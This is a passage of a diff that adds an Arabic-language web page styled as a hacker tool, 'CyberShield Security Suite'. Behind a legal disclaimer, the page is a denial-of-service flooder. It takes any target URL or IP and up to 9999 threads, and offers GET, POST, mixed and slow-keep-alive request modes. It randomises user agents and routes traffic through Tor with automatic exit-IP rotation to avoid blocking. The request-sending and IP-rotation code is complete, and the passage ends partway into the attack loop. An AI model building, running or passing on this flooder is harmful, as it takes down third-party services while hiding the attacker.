+            }
+            .disclaimer-footer {
+                flex-direction: column;
+            }
+            .disclaimer-footer .btn-disclaimer {
+                padding: 10px;
+                font-size: 13px;
+            }
+            .disclaimer-title {
+                font-size: 14px;
+            }
+
+            .tor-status-bar {
+                padding: 8px 10px;
+            }
+            .tor-status-bar .exit-ip {
+                font-size: 10px;
+                padding: 1px 8px;
+            }
+            .tor-status-bar .status-text {
+                font-size: 11px;
+            }
+            .tor-status-bar .status-text .port-badge {
+                font-size: 8px;
+                padding: 0px 6px;
+            }
+
+            .status-display {
+                font-size: 12px;
+                padding: 10px 12px;
+                min-height: 38px;
+            }
+
+            .log-box {
+                max-height: 48px;
+                font-size: 9px;
+                padding: 6px 10px;
+                min-height: 38px;
+            }
+
+            .sysinfo-box {
+                padding: 20px 16px 16px;
+            }
+            .sysinfo-item {
+                font-size: 11px;
+                flex-wrap: wrap;
+                gap: 2px;
+            }
+            .sysinfo-item .value {
+                max-width: 100%;
+                text-align: right;
+                font-size: 10px;
+            }
+
+            .btn-security {
+                padding: 4px 12px;
+                font-size: 10px;
+            }
+            .btn-security .shield-icon {
+                font-size: 10px;
+            }
+
+            .tor-proxy-info {
+                font-size: 8px;
+                gap: 6px;
+            }
+            .tor-proxy-info .proxy-item .badge {
+                font-size: 7px;
+                padding: 0px 6px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .main-card {
+                padding: 10px 8px;
+            }
+            .adv-grid {
+                grid-template-columns: 1fr;
+            }
+            .stats-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 4px;
+            }
+            .stat-card {
+                padding: 6px 2px;
+            }
+            .stat-number {
+                font-size: 13px;
+            }
+            .brand-text {
+                font-size: 13px;
+            }
+            .brand-icon {
+                width: 28px;
+                height: 28px;
+                font-size: 12px;
+            }
+            .app-header {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 6px;
+            }
+            .header-actions {
+                justify-content: flex-start;
+            }
+        }
+
+        /* ============================================================
+                   UTILITY
+                ============================================================ */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================
+    MATRIX RAIN BACKGROUND
+    ============================================================ -->
+    <div class="matrix-bg" id="matrixBg">
+        <canvas id="matrixCanvas"></canvas>
+    </div>
+
+    <!-- ============================================================
+    DISCLAIMER OVERLAY - Hacker Style
+    ============================================================ -->
+    <div class="disclaimer-overlay active" id="disclaimerOverlay" role="dialog" aria-modal="true">
+        <div class="disclaimer-box">
+            <span class="disclaimer-icon">🛡️</span>
+            <div class="disclaimer-title">
+                █ LEGAL NOTICE <span class="cursor-blink">█</span>
+            </div>
+
+            <div class="disclaimer-body">
+                <p>يرجى قراءة هذا الإشعار بعناية قبل المتابعة.</p>
+                <br>
+                <p>تم تصميم هذه الأداة <strong>لأغراض تعليمية وبحثية واختبارية</strong>، لدعم دراسة مفاهيم أمن المعلومات وتقييم الأنظمة داخل البيئات المصرح بها فقط.</p>
+                <br>
+                <p>باستخدام هذه الأداة، فإنك تقر وتوافق على أنك ستستخدمها <strong>حصريًا على الأنظمة أو الخدمات التي تمتلكها أو التي حصلت على تفويض قانوني وصريح لاختبارها</strong>، وأنك تتحمل المسؤولية الكاملة عن جميع الإجراءات التي يتم تنفيذها من خلالها.</p>
+
+                <div class="disclaimer-divider"></div>
+
+                <p>لا يتحمل المطور أو أي مساهم في تطوير هذه الأداة أي مسؤولية عن أي استخدام غير مصرح به، أو أي مخالفة للقوانين واللوائح المحلية أو الدولية، أو أي أضرار مباشرة أو غير مباشرة قد تنتج عن سوء استخدامها.</p>
+                <br>
+                <p>نحن نؤمن بأن المعرفة التقنية يجب أن تُستخدم <span class="highlight">لتعزيز الأمن الرقمي</span>، ورفع مستوى الوعي، والمساهمة في تطوير بيئات تقنية أكثر أمانًا، مع الالتزام الكامل بالأخلاقيات المهنية واحترام الأنظمة والقوانين المعمول بها.</p>
+
+                <div class="disclaimer-divider"></div>
+
+                <p><strong>بالضغط على زر "أوافق" أنت تؤكد أنك قرأت هذا الإشعار، وفهمت مضمونه، وتوافق على الالتزام بالاستخدام المسؤول والقانوني.</strong></p>
+            </div>
+
+            <div class="disclaimer-footer">
+                <button class="btn-disclaimer btn-agree" id="disclaimerAgree">> أوافق</button>
+                <button class="btn-disclaimer btn-decline" id="disclaimerDecline">x أرفض</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+    SYSTEM INFO MODAL - Terminal Style
+    ============================================================ -->
+    <div class="sysinfo-overlay" id="sysinfoOverlay" role="dialog" aria-modal="true">
+        <div class="sysinfo-box">
+            <div class="sysinfo-title">
+                <span class="icon">🖥️</span> SYSTEM INFO
+            </div>
+
+            <div class="sysinfo-item">
+                <span class="label">الإصدار</span>
+                <span class="value">v3.2.1</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">آخر تحديث</span>
+                <span class="value">2026-08-06</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">حالة النظام</span>
+                <span class="value online" id="sysStatus">● جاهز</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">حالة Tor</span>
+                <span class="value" id="sysTorStatus">● جاري التحقق</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">Exit IP</span>
+                <span class="value" id="sysTorIp">--</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">وكيل SOCKS5</span>
+                <span class="value">127.0.0.1:9050</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">خادم HTTP</span>
+                <span class="value">127.0.0.1:3000</span>
+            </div>
+            <div class="sysinfo-item">
+                <span class="label">الطلبات المرسلة</span>
+                <span class="value" id="sysPackets">0</span>
+            </div>
+            <div class="sysinfo-item" style="border-bottom:none;">
+                <span class="label">المطور</span>
+                <span class="value">CyberShield Labs</span>
+            </div>
+
+            <button class="sysinfo-close" id="sysinfoClose">[X] إغلاق</button>
+        </div>
+    </div>
+
+    <!-- ============================================================
+    MAIN APPLICATION
+    ============================================================ -->
+    <div class="app-container" id="appContainer">
+
+        <div class="main-card" role="main">
+
+            <!-- HEADER -->
+            <div class="app-header">
+                <div class="app-brand">
+                    <div class="brand-icon" aria-hidden="true">⚡<span class="cursor-blink">_</span></div>
+                    <div>
+                        <div class="brand-text">Cyber<span>Shield</span><span class="cursor-blink">_</span></div>
+                        <span class="brand-sub">Security Suite</span>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <button class="btn-security" id="sysinfoBtn">
+                        <span class="shield-icon">🛡️</span>
+                        <span>SysInfo</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- TOR STATUS -->
+            <div class="tor-status-bar" id="torStatusBar">
+                <div class="tor-status-row">
+                    <span class="dot checking" id="torDot" aria-hidden="true"></span>
+                    <span class="status-text" id="torStatusText">
+                        جاري التحقق من <strong>Tor</strong>...
+                        <span class="port-badge">:9050</span>
+                    </span>
+                    <span class="exit-ip loading" id="torIpDisplay">جاري الجلب...</span>
+                </div>
+                <div class="tor-proxy-info">
+                    <span class="proxy-item">
+                        SOCKS5
+                        <span class="badge" id="socks5Status">جاري</span>
+                    </span>
+                    <span class="proxy-item">
+                        HTTP
+                        <span class="badge" id="httpStatus">جاري</span>
+                    </span>
+                    <span class="proxy-item">
+                        Exit IP
+                        <span class="badge" id="exitStatus">جاري</span>
+                    </span>
+                </div>
+            </div>
+
+            <!-- STATUS DISPLAY -->
+            <div class="status-display idle" id="statusDisplay">
+                <span class="icon">$</span>
+                <span id="statusMessage">النظام جاهز</span>
+            </div>
+
+            <!-- TARGET -->
+            <div class="form-group">
+                <label for="targetInput">
+                    <span class="icon">></span> الهدف (URL / IP)
+                </label>
+                <input type="text" id="targetInput" class="form-control" placeholder="example.com / 192.168.1.1" autocomplete="off">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="threadsInput">
+                        <span class="icon">#</span> عدد الخيوط
+                    </label>
+                    <input type="number" id="threadsInput" class="form-control" value="100" min="1" max="9999">
+                </div>
+                <div class="form-group">
+                    <label for="attackMode">
+                        <span class="icon">◈</span> نمط الهجوم
+                    </label>
+                    <select id="attackMode" class="form-control">
+                        <option value="get">GET</option>
+                        <option value="post">POST</option>
+                        <option value="mixed">MIXED</option>
+                        <option value="slow">SLOW</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- ADVANCED TOGGLE -->
+            <button class="adv-toggle" id="advToggle" aria-expanded="false">
+                <span class="arrow" id="advArrow">▶</span>
+                <span>خيارات متقدمة</span>
+            </button>
+
+            <div class="adv-section" id="advSection" role="region" aria-hidden="true">
+                <div class="adv-grid">
+                    <label class="adv-check">
+                        <input type="checkbox" id="proxyChain" checked> Proxy Chain
+                    </label>
+                    <label class="adv-check">
+                        <input type="checkbox" id="dnsOverHttps" checked> DNS-over-HTTPS
+                    </label>
+                    <label class="adv-check">
+                        <input type="checkbox" id="fingerprintSpoof" checked> تغيير البصمة
+                    </label>
+                    <label class="adv-check">
+                        <input type="checkbox" id="ipRotation" checked> تبديل IP تلقائي
+                    </label>
+                    <label class="adv-check">
+                        <input type="checkbox" id="randomDelay" checked> تأخير عشوائي
+                    </label>
+                    <div class="form-group" style="margin:0;">
+                        <label style="font-size:9px;letter-spacing:0.5px;">تبديل IP كل</label>
+                        <input type="number" id="rotationCount" value="20" min="5" max="500" class="form-control adv-small-input">
+                    </div>
+                </div>
+                <div class="form-group" style="margin-top:6px;">
+                    <label style="font-size:9px;letter-spacing:0.5px;">بروكسيات إضافية</label>
+                    <input type="text" id="extraProxies" class="form-control adv-small-input" placeholder="socks5://127.0.0.1:9050">
+                </div>
+            </div>
+
+            <!-- BUTTONS -->
+            <div class="btn-group">
+                <button class="btn btn-start" id="startBtn">
+                    <span class="btn-icon">></span> بدء الهجوم
+                </button>
+                <button class="btn btn-stop" id="stopBtn" disabled>
+                    <span class="btn-icon">■</span> إيقاف
+                </button>
+            </div>
+
+            <!-- STATS -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <span class="stat-number total" id="packetCount">0</span>
+                    <span class="stat-label">إجمالي</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number success" id="successCount">0</span>
+                    <span class="stat-label">ناجحة</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number fail" id="failCount">0</span>
+                    <span class="stat-label">فاشلة</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number rate" id="rateCount">0</span>
+                    <span class="stat-label">طلب/ث</span>
+                </div>
+            </div>
+
+            <!-- LOG -->
+            <div class="log-section">
+                <div class="log-header">
+                    <span class="log-label">[ سجل العمليات ]</span>
+                    <div class="log-actions">
+                        <button class="btn-log-clear" id="clearLogBtn">[X] مسح</button>
+                    </div>
+                </div>
+                <div class="log-box" id="logBox" role="log" aria-live="polite">
+                    <div class="log-entry info">
+                        <span class="log-time">[--:--:--]</span>
+                        <span class="log-msg">النظام جاهز</span>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ============================================================
+    JAVASCRIPT - Full functionality preserved
+    ============================================================ -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // MATRIX RAIN BACKGROUND
+            // ============================================================
+            (function initMatrix() {
+                const canvas = document.getElementById('matrixCanvas');
+                const ctx = canvas.getContext('2d');
+                let width, height, columns, drops;
+
+                function resize() {
+                    const container = document.getElementById('matrixBg');
+                    width = container.clientWidth;
+                    height = container.clientHeight;
+                    canvas.width = width;
+                    canvas.height = height;
+                    columns = Math.floor(width / 18);
+                    drops = Array(columns).fill(1);
+                }
+
+                resize();
+                window.addEventListener('resize', resize);
+
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&?*';
+                const fontSize = 16;
+
+                function draw() {
+                    ctx.fillStyle = 'rgba(5, 10, 15, 0.04)';
+                    ctx.fillRect(0, 0, width, height);
+
+                    ctx.fillStyle = '#00ff41';
+                    ctx.font = fontSize + 'px monospace';
+
+                    for (let i = 0; i < drops.length; i++) {
+                        const text = chars[Math.floor(Math.random() * chars.length)];
+                        const x = i * 18 + 4;
+                        const y = drops[i] * fontSize;
+
+                        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)';
+                        ctx.fillText(text, x, y);
+
+                        if (y > height && Math.random() > 0.98) {
+                            drops[i] = 0;
+                        }
+                        drops[i]++;
+                    }
+                }
+
+                function animate() {
+                    draw();
+                    requestAnimationFrame(animate);
+                }
+
+                animate();
+            })();
+
+            // ============================================================
+            // CONFIGURATION
+            // ============================================================
+            const TOR_CONFIG = {
+                SOCKS5_HOST: '127.0.0.1',
+                SOCKS5_PORT: 9050,
+                HTTP_CHECK_HOST: '127.0.0.1',
+                HTTP_CHECK_PORT: 3000,
+                HTTP_CHECK_PATH: '/tor/status',
+                IP_CHECK_URL: 'https://api.ipify.org?format=json'
+            };
+
+            // ============================================================
+            // DOM REFS
+            // ============================================================
+            const $ = (id) => document.getElementById(id);
+
+            const disclaimerOverlay = $('disclaimerOverlay');
+            const disclaimerAgree = $('disclaimerAgree');
+            const disclaimerDecline = $('disclaimerDecline');
+            const appContainer = $('appContainer');
+
+            const sysinfoOverlay = $('sysinfoOverlay');
+            const sysinfoBtn = $('sysinfoBtn');
+            const sysinfoClose = $('sysinfoClose');
+            const sysStatus = $('sysStatus');
+            const sysTorStatus = $('sysTorStatus');
+            const sysTorIp = $('sysTorIp');
+            const sysPackets = $('sysPackets');
+
+            const statusDisplay = $('statusDisplay');
+            const statusMessage = $('statusMessage');
+            const targetInput = $('targetInput');
+            const threadsInput = $('threadsInput');
+            const startBtn = $('startBtn');
+            const stopBtn = $('stopBtn');
+            const packetSpan = $('packetCount');
+            const successSpan = $('successCount');
+            const failSpan = $('failCount');
+            const rateSpan = $('rateCount');
+            const torDot = $('torDot');
+            const torStatusText = $('torStatusText');
+            const torIpDisplay = $('torIpDisplay');
+            const logBox = $('logBox');
+            const attackMode = $('attackMode');
+            const advToggle = $('advToggle');
+            const advSection = $('advSection');
+            const advArrow = $('advArrow');
+            const clearLogBtn = $('clearLogBtn');
+
+            const socks5Status = $('socks5Status');
+            const httpStatus = $('httpStatus');
+            const exitStatus = $('exitStatus');
+
+            // ============================================================
+            // STATE
+            // ============================================================
+            let isRunning = false;
+            let stopRequested = false;
+            let packetCounter = 0;
+            let successCounter = 0;
+            let failCounter = 0;
+            let ipChangeCounter = 0;
+            let startTime = 0;
+            let isAppEnabled = false;
+            let currentExitIp = '--';
+            let torCheckInterval = null;
+            let attackLoopRunning = false;
+
+            let torStatus = {
+                socks5: false,
+                http: false,
+                exitIp: '--',
+                connected: false
+            };
+
+            // ============================================================
+            // DISCLAIMER HANDLING
+            // ============================================================
+            function enableApp() {
+                isAppEnabled = true;
+                disclaimerOverlay.classList.remove('active');
+                appContainer.classList.add('active');
+                document.body.style.overflow = '';
+                addLog('تم قبول إخلاء المسؤولية - الأداة جاهزة', 'success');
+                setStatus('النظام جاهز', 'idle');
+                checkTor();
+                torCheckInterval = setInterval(checkTor, 8000);
+            }
+
+            function disableApp() {
+                isAppEnabled = false;
+                disclaimerOverlay.classList.remove('active');
+                appContainer.classList.add('active');
+                appContainer.style.opacity = '0.2';
+                appContainer.style.pointerEvents = 'none';
+                appContainer.style.filter = 'grayscale(0.7)';
+                document.body.style.overflow = '';
+                const msg = document.createElement('div');
+                msg.style.cssText = `
+                            position: fixed; inset: 0; z-index: 9998;
+                            display: flex; align-items: center; justify-content: center;
+                            background: rgba(5,10,15,0.95);
+                            color: #ff0040; font-family: 'Share Tech Mono', monospace;
+                            font-size: 18px; font-weight: 700;
+                            letter-spacing: 2px; text-align: center;
+                            padding: 40px; backdrop-filter: blur(8px);
+                            animation: terminalFade 0.6s ease;
+                            flex-direction: column;
+                            gap: 20px;
+                        `;
+                msg.id = 'appBlockedMsg';
+                msg.innerHTML = `
+                            ⛔ ACCESS DENIED<br>
+                            <span style="font-size:13px;color:rgba(255,255,255,0.2);">
+                                تم رفض إخلاء المسؤولية - الأداة غير متاحة
+                            </span>
+                            <button onclick="location.reload()" style="
+                                margin-top: 10px; padding: 12px 36px;
+                                background: transparent; border: 1px solid #ff0040;
+                                border-radius: 4px; color: #ff0040;
+                                font-size: 13px; cursor: pointer; font-family: 'Share Tech Mono', monospace;
+                                transition: all 0.3s ease;
+                                letter-spacing: 1px;
+                            " onmouseover="this.style.background='rgba(255,0,64,0.1)'" 
+                               onmouseout="this.style.background='transparent'">
+                                [ إعادة المحاولة ]
+                            </button>
+                        `;
+                document.body.appendChild(msg);
+                addLog('تم رفض إخلاء المسؤولية - الأداة مقفلة', 'error');
+            }
+
+            disclaimerAgree.addEventListener('click', enableApp);
+            disclaimerDecline.addEventListener('click', disableApp);
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && disclaimerOverlay.classList.contains('active')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                }
+            });
+
+            disclaimerOverlay.addEventListener('click', function(e) {
+                if (e.target === disclaimerOverlay) {}
+            });
+
+            // ============================================================
+            // SYSTEM INFO
+            // ============================================================
+            function openSysInfo() {
+                sysStatus.textContent = statusMessage.textContent;
+                sysStatus.className = 'value ' + (statusDisplay.className.includes('active') ? 'online' :
+                    statusDisplay.className.includes('warning') ? 'warning' :
+                    statusDisplay.className.includes('error') ? 'offline' : 'online');
+
+                sysTorStatus.textContent = torStatus.connected ? '● متصل' : '● غير متصل';
+                sysTorStatus.className = 'value ' + (torStatus.connected ? 'online' : 'offline');
+
+                sysTorIp.textContent = torStatus.exitIp || '--';
+                sysTorIp.className = 'value ' + (torStatus.connected && torStatus.exitIp !== '--' ? 'online' :
+                'offline');
+
+                sysPackets.textContent = packetCounter.toLocaleString();
+
+                sysinfoOverlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+
+            function closeSysInfo() {
+                sysinfoOverlay.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+
+            sysinfoBtn.addEventListener('click', function() {
+                if (isAppEnabled) {
+                    openSysInfo();
+                } else {
+                    const msg = document.createElement('div');
+                    msg.style.cssText = `
+                                position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+                                background: rgba(255,0,64,0.08); border: 1px solid #ff0040;
+                                color: #ff0040; padding: 10px 20px; border-radius: 4px;
+                                font-size: 12px; z-index: 9999;
+                                font-family: 'Share Tech Mono', monospace;
+                                animation: terminalFade 0.3s ease;
+                            `;
+                    msg.textContent = '⚠ ACCESS DENIED: يجب الموافقة على إخلاء المسؤولية أولاً';
+                    document.body.appendChild(msg);
+                    setTimeout(() => msg.remove(), 2500);
+                }
+            });
+
+            sysinfoClose.addEventListener('click', closeSysInfo);
+            sysinfoOverlay.addEventListener('click', function(e) {
+                if (e.target === sysinfoOverlay) closeSysInfo();
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && sysinfoOverlay.classList.contains('active')) {
+                    closeSysInfo();
+                }
+            });
+
+            // ============================================================
+            // ADVANCED TOGGLE
+            // ============================================================
+            advToggle.addEventListener('click', function() {
+                const isOpen = advSection.classList.toggle('open');
+                advArrow.classList.toggle('open');
+                advToggle.setAttribute('aria-expanded', isOpen);
+            });
+
+            // ============================================================
+            // LOG SYSTEM
+            // ============================================================
+            function addLog(message, type = 'info') {
+                const entry = document.createElement('div');
+                entry.className = `log-entry ${type}`;
+                const time = new Date().toLocaleTimeString();
+                entry.innerHTML = `
+                            <span class="log-time">[${time}]</span>
+                            <span class="log-msg">${message}</span>
+                        `;
+                logBox.appendChild(entry);
+                logBox.scrollTop = logBox.scrollHeight;
+
+                while (logBox.children.length > 120) {
+                    logBox.removeChild(logBox.firstChild);
+                }
+            }
+
+            clearLogBtn.addEventListener('click', function() {
+                logBox.innerHTML = '';
+                addLog('تم مسح السجل', 'info');
+            });
+
+            // ============================================================
+            // STATUS UPDATER
+            // ============================================================
+            function setStatus(message, type = 'idle') {
+                const iconMap = {
+                    idle: '$',
+                    ready: '✔',
+                    active: '⚡',
+                    warning: '⚠',
+                    error: '✖'
+                };
+
+                statusDisplay.className = `status-display ${type}`;
+                statusMessage.textContent = message;
+                const iconEl = statusDisplay.querySelector('.icon');
+                if (iconEl) {
+                    iconEl.textContent = iconMap[type] || '$';
+                }
+            }
+
+            function updateProxyBadges() {
+                socks5Status.textContent = torStatus.socks5 ? 'متصل' : 'غير متصل';
+                socks5Status.className = 'badge ' + (torStatus.socks5 ? 'online' : 'offline');
+
+                httpStatus.textContent = torStatus.http ? 'متصل' : 'غير متصل';
+                httpStatus.className = 'badge ' + (torStatus.http ? 'online' : 'offline');
+
+                if (torStatus.exitIp && torStatus.exitIp !== '--') {
+                    exitStatus.textContent = torStatus.exitIp;
+                    exitStatus.className = 'badge online';
+                } else {
+                    exitStatus.textContent = 'جاري...';
+                    exitStatus.className = 'badge';
+                }
+
+                torStatus.connected = torStatus.socks5 || torStatus.http;
+            }
+
+            // ============================================================
+            // REAL TOR CHECK
+            // ============================================================
+            async function checkTor() {
+                if (!isAppEnabled) return;
+
+                torDot.className = 'dot checking';
+                torStatusText.innerHTML = 'جاري التحقق من <strong>Tor</strong>... <span class="port-badge">:9050</span>';
+                torIpDisplay.textContent = 'جاري الجلب...';
+                torIpDisplay.className = 'exit-ip loading';
+
+                let socks5Ok = false;
+                let httpOk = false;
+                let exitIp = '--';
+
+                // SOCKS5 Check
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 3000);
+                    await fetch(`http://${TOR_CONFIG.SOCKS5_HOST}:${TOR_CONFIG.SOCKS5_PORT}`, {
+                        method: 'HEAD',
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeout);
+                    socks5Ok = true;
+                    addLog('SOCKS5 Proxy متصل (127.0.0.1:9050)', 'success');
+                } catch {
+                    socks5Ok = false;
+                    addLog('SOCKS5 Proxy غير متصل (127.0.0.1:9050)', 'warning');
+                }
+
+                // HTTP Check
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 3000);
+                    const response = await fetch(
+                        `http://${TOR_CONFIG.HTTP_CHECK_HOST}:${TOR_CONFIG.HTTP_CHECK_PORT}${TOR_CONFIG.HTTP_CHECK_PATH}`, {
+                            method: 'GET',
+                            cache: 'no-cache',
+                            signal: controller.signal,
+                            headers: { 'Accept': 'application/json' }
+                        }
+                    );
+                    clearTimeout(timeout);
+                    if (response.ok) {
+                        const data = await response.json();
+                        httpOk = true;
+                        if (data.status === 'connected' && data.ip) {
+                            exitIp = data.ip;
+                        }
+                        addLog('HTTP Check Server متصل (127.0.0.1:3000)', 'success');
+                    } else {
+                        httpOk = false;
+                        addLog('HTTP Check Server غير متصل', 'warning');
+                    }
+                } catch {
+                    httpOk = false;
+                    addLog('HTTP Check Server غير متاح (127.0.0.1:3000)', 'warning');
+                }
+
+                // Get IP via ipify
+                if (!exitIp || exitIp === '--') {
+                    try {
+                        const ipController = new AbortController();
+                        const ipTimeout = setTimeout(() => ipController.abort(), 5000);
+                        const ipResponse = await fetch(TOR_CONFIG.IP_CHECK_URL, {
+                            signal: ipController.signal,
+                            cache: 'no-cache'
+                        });
+                        clearTimeout(ipTimeout);
+                        if (ipResponse.ok) {
+                            const ipData = await ipResponse.json();
+                            exitIp = ipData.ip;
+                            addLog(`Exit IP: ${exitIp}`, 'info');
+                        }
+                    } catch {
+                        addLog('فشل جلب Exit IP', 'warning');
+                    }
+                }
+
+                torStatus.socks5 = socks5Ok;
+                torStatus.http = httpOk;
+                torStatus.exitIp = exitIp || '--';
+                torStatus.connected = socks5Ok || httpOk;
+
+                if (torStatus.connected) {
+                    torDot.className = 'dot on';
+                    torStatusText.innerHTML =
+                        `Tor <strong>متصل</strong> <span class="port-badge">:9050</span>`;
+                    if (torStatus.exitIp && torStatus.exitIp !== '--') {
+                        torIpDisplay.textContent = torStatus.exitIp;
+                        torIpDisplay.className = 'exit-ip';
+                        currentExitIp = torStatus.exitIp;
+                    } else {
+                        torIpDisplay.textContent = 'متاح (IP غير معروف)';
+                        torIpDisplay.className = 'exit-ip';
+                    }
+                    setStatus('Tor جاهز', 'ready');
+                    addLog(`Tor متصل - Exit IP: ${torStatus.exitIp}`, 'success');
+                } else {
+                    torDot.className = 'dot off';
+                    torStatusText.innerHTML =
+                        `Tor <strong>غير متصل</strong> <span class="port-badge">:9050</span>`;
+                    torIpDisplay.textContent = 'غير متاح';
+                    torIpDisplay.className = 'exit-ip';
+                    currentExitIp = '--';
+                    setStatus('يرجى تشغيل Orbot/Tor (منفذ 9050 أو 3000)', 'warning');
+                    addLog('Tor غير متصل - يرجى تشغيل Orbot', 'error');
+                }
+
+                updateProxyBadges();
+            }
+
+            // ============================================================
+            // USER AGENT
+            // ============================================================
+            function getRandomUA() {
+                const list = [
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1'
+                ];
+                return list[Math.floor(Math.random() * list.length)];
+            }
+
+            // ============================================================
+            // SEND REQUEST
+            // ============================================================
+            async function sendRequest(url) {
+                let fullUrl = url;
+                if (!fullUrl.startsWith('http://') && !fullUrl.startsWith('https://')) {
+                    fullUrl = 'http://' + fullUrl;
+                }
+                fullUrl += `?_=${Date.now()}&r=${Math.random().toString(36).substring(7)}`;
+
+                const headers = {
+                    'User-Agent': getRandomUA(),
+                    'Accept': '*/*',
+                    'Accept-Language': 'ar,en;q=0.9',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache',
+                    'DNT': '1',
+                    'Connection': 'keep-alive'
+                };
+
+                const mode = attackMode.value;
+                let options = {
+                    method: 'GET',
+                    headers: headers,
+                    cache: 'no-cache',
+                    mode: 'cors',
+                    credentials: 'omit',
+                    referrerPolicy: 'no-referrer'
+                };
+
+                if (mode === 'post') {
+                    options.method = 'POST';
+                    options.body = JSON.stringify({ x: Math.random().toString(36) });
+                    headers['Content-Type'] = 'application/json';
+                } else if (mode === 'mixed') {
+                    options.method = Math.random() > 0.5 ? 'POST' : 'GET';
+                    if (options.method === 'POST') {
+                        options.body = JSON.stringify({ x: Math.random().toString(36) });
+                        headers['Content-Type'] = 'application/json';
+                    }
+                } else if (mode === 'slow') {
+                    headers['Connection'] = 'keep-alive';
+                    headers['Keep-Alive'] = 'timeout=9999, max=1000';
+                }
+
+                if (document.getElementById('fingerprintSpoof').checked) {
+                    headers['X-Spoofed'] = '1';
+                }
+
+                try {
+                    const ctrl = new AbortController();
+                    const timeout = setTimeout(() => ctrl.abort(), 5000);
+                    options.signal = ctrl.signal;
+                    const resp = await fetch(fullUrl, options);
+                    clearTimeout(timeout);
+                    return { success: true, status: resp.status };
+                } catch {
+                    return { success: false };
+                }
+            }
+
+            // ============================================================
+            // ROTATE IP
+            // ============================================================
+            async function rotateIp() {
+                try {
+                    if (torStatus.http) {
+                        try {
+                            const response = await fetch(
+                                `http://${TOR_CONFIG.HTTP_CHECK_HOST}:${TOR_CONFIG.HTTP_CHECK_PORT}/tor/rotate`, {
+                                    method: 'POST',
+                                    cache: 'no-cache',
+                                    headers: { 'Content-Type': 'application/json' }
+                                }
+                            );
+                            if (response.ok) {
+                                ipChangeCounter++;
+                                addLog(`تبديل IP #${ipChangeCounter}`, 'info');
+                                await fetchNewExitIp();
+                                return;
+                            }
+                        } catch {}
+                    }
+
+                    try {
+                        await fetch(`http://${TOR_CONFIG.SOCKS5_HOST}:${TOR_CONFIG.SOCKS5_PORT}`, {
+                            method: 'HEAD',
+                            mode: 'no-cors',
+                            cache: 'no-cache'
+                        });
+                        ipChangeCounter++;
+                        addLog(`تبديل IP #${ipChangeCounter}`, 'info');
+                        await fetchNewExitIp();
+                    } catch {
+                        addLog('فشل تبديل IP عبر Tor', 'error');
+                    }
+                } catch {
+                    addLog('فشل تبديل IP عبر Tor', 'error');
+                }
+            }
+
+            async function fetchNewExitIp() {
+                try {
+                    const ipRes = await fetch(TOR_CONFIG.IP_CHECK_URL, {
+                        signal: AbortSignal.timeout(3000),
+                        cache: 'no-cache'
+                    });
+                    if (ipRes.ok) {
+                        const ipData = await ipRes.json();
+                        currentExitIp = ipData.ip;
+                        torIpDisplay.textContent = currentExitIp;
+                        torIpDisplay.className = 'exit-ip';
+                        torStatus.exitIp = currentExitIp;
+                        exitStatus.textContent = currentExitIp;
+                        exitStatus.className = 'badge online';
+                        addLog(`Exit IP الجديد: ${currentExitIp}`, 'info');
+                    }
+                } catch {}
+            }
+
+            // ============================================================
+            // ATTACK LOOP
+            // ============================================================
+            async function attackLoop() {
+                if (attackLoopRunning) return;
+                attackLoopRunning = true;
+
+                const target = targetInput.value.trim();
+                if (!target) {
+                    setStatus('يرجى إدخال هدف', 'warning');
+                    attackLoopRunning = false;
+                    return;
+                }
+
+                await checkTor();
+
+                if (!torStatus.connected) {
+                    setStatus('Tor غير متصل - لا يمكن بدء الهجوم', 'error');
+                    addLog('الهجوم ملغي: Tor غير متصل', 'error');
+                    attackLoopRunning = false;
+                    startBtn.disabled = false;
+                    stopBtn.disabled = true;
+                    return;
+                }
+
